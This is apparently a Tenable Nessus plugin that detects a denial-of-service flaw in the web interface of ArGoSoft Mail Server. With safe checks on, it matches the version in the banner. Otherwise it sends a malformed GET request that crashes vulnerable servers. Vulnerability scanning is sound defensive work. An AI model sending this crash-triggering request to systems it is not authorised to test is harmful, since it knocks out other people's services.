#
# (C) Tenable Network Security, Inc.
#

# From: "Rushjo@tripbit.org" <rushjo@tripbit.org>
# To: bugtraq@security-focus.com
# Subject: Denial of Service Attack against ArGoSoft Mail Server Version 1.8 
# 


include("compat.inc");

if(description)
{
  script_id(11734);
  script_version ("$Revision: 1.14 $");
  
  script_bugtraq_id(7873);
  script_osvdb_id(2138);

  script_name(english:"ArGoSoft Mail Server HTTP Daemon GET Request Saturation DoS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote mail server suffers from a denial of service vulnerability." );
 script_set_attribute(attribute:"description", value:
"It is possible to kill the remote HTTP server by sending an invalid
request to it.  An unauthenticated attacker may leverage this issue
to crash the affected server." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/324750" );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"plugin_publication_date", value: "2003/06/11");
 script_set_attribute(attribute:"vuln_publication_date", value: "2003/06/11");
 script_cvs_date("$Date: 2011/03/14 21:48:01 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();

 
  script_summary(english:"Bad HTTP request");
  script_category(ACT_MIXED_ATTACK);
  script_copyright(english:"This script is Copyright (C) 2003-2011 Tenable Network Security, Inc.");
  script_family(english:"Web Servers");
  script_require_ports("Services/www", 80);
  script_dependencie("http_version.nasl");
  exit(0);
}

########

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80);

banner = get_http_banner(port:port);
if ( "ArGoSoft" >!< banner ) exit(0);

if( safe_checks() )
{
 if(egrep(pattern:"^Server: ArGoSoft Mail Server.*.1\.([0-7]\..*|8\.([0-2]\.|3\.[0-5]))", string:banner))
 	{
	security_warning(port);
	}
 exit(0);	
}

if (http_is_dead(port: port)) exit(0);

r = http_send_recv_buf(port: port, data: 'GET  /index.html\n\n');

if (http_is_dead(port: port)) {  security_warning(port); exit(0); }
